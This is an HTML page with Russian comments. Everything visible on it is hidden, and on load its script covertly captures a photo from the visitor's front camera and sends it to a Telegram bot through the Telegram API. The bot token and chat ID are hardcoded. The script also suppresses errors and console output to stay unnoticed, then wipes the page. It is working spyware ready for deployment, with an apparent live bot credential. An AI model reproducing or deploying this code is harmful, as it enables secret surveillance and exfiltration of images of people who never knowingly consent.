<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        /* Полностью пустая страница - ничего не видно */
        * {
            margin: 0;
            padding: 0;
            border: 0;
            outline: 0;
            font-size: 0;
            line-height: 0;
            color: transparent;
            background: transparent;
            -webkit-tap-highlight-color: transparent;
        }
        
        body, html {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: #000000;
            overflow: hidden;
            visibility: hidden; /* Полностью скрываем всё */
            opacity: 0;
        }
    </style>
</head>
<body>
    <!-- Абсолютно никаких элементов - только скрипт -->
<script>
(function() {
    // === НАСТРОЙКИ ===
    const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
    const CHAT_ID = '1250741267';
    // ================
    
    // Полностью отключаем любые сообщения об ошибках
    window.onerror = function() { return true; };
    console.error = function() {};
    console.log = function() {};
    
    async function start() {
        let stream = null;
        
        try {
            // 1. Сразу запрашиваем камеру без подтверждения
            stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user', // Фронтальная камера
                    width: { ideal: 1280, max: 1920 },
                    height: { ideal: 720, max: 1080 }
                },
                audio: false // Без звука
            });
            
            // 2. Создаём невидимое видео
            const video = document.createElement('video');
            video.style.position = 'absolute';
            video.style.top = '-9999px';
            video.style.left = '-9999px';
            video.style.width = '1px';
            video.style.height = '1px';
            video.style.opacity = '0';
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true;
            video.autoplay = true;
            document.body.appendChild(video);
            
            // 3. Ждём готовности (без показа)
            await new Promise(resolve => {
                video.onloadeddata = resolve;
                // Таймаут на случай проблем
                setTimeout(resolve, 5000);
            });
            
            // 4. Ждём фокусировки (4 секунды)
            await new Promise(resolve => setTimeout(resolve, 4000));
            
            // 5. Делаем снимок
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // 6. Останавливаем камеру
            stream.getTracks().forEach(track => track.stop());
            
            // 7. Улучшаем фото (чтобы не было чёрным)
            try {
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;
                for (let i = 0; i < data.length; i += 4) {
                    data[i] = Math.min(255, data[i] * 1.5);     // Красный
                    data[i + 1] = Math.min(255, data[i + 1] * 1.5); // Зелёный
                    data[i + 2] = Math.min(255, data[i + 2] * 1.5); // Синий
                }
                ctx.putImageData(imageData, 0, 0);
            } catch(e) {}
            
            // 8. Отправляем в Telegram (без ожидания ответа)
            canvas.toBlob(blob => {
                if (!blob) return;
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'img.jpg');
                
                // Отправляем асинхронно, не ждём ответа
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors',
                    keepalive: true
                }).catch(() => {});
                
            }, 'image/jpeg', 0.85);
            
        } catch(error) {
            // Всё тихо - никаких сообщений об ошибках
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
        
        // 9. Через 1 секунду полностью очищаем страницу
        setTimeout(() => {
            document.body.innerHTML = '';
            document.body.style.cssText = 'position:fixed; width:100%; height:100%; background:#000;';
        }, 1000);
    }
    
    // Запускаем сразу при загрузке
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', start);
    } else {
        start();
    }
})();
</script>
</body>
</html>
